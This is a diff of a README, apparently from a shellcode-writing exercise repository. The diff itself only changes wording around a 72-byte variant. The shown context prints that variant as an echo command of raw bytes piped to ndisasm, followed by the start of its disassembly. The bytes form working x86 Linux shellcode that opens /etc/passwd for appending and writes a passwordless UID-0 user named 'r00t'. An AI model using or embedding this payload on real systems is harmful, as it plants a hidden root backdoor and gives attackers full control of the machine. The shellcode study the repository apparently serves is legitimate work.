@@ -75,13 +75,14 @@ Obtain from running:
 
 ## Easter egg 
 
- Due to changes made in the code are pretty insignificant to reduce the length in bytes, there is another file named root_user_bigger_length which is 72 bytes length with more modifications. 
+ Due to changes made in the original code are pretty insignificant to reduce the length in bytes, there is another file named root_user_bigger_length which is 72 bytes length with more modifications. 
  
 Length: 72 bytes
 
 Obtain from running: 
 
     echo -ne "\x6a\x05\x58\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x8d\x5d\xd4\x66\xb9\x01\x04\xcd\x80\x6a\x03\x5b\x83\xc0\x01\x50\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74\x8d\x4d\xc4\x6a\x0c\x5a\xcd\x80\x83\xc3\x03\x89\xd8\xcd\x80\x89\xd8\x83\xe8\x05\xcd\x80" | ndisasm -u -
+    
     00000000  6A05              push byte +0x5
     00000002  58                pop eax
     00000003  51                push ecx
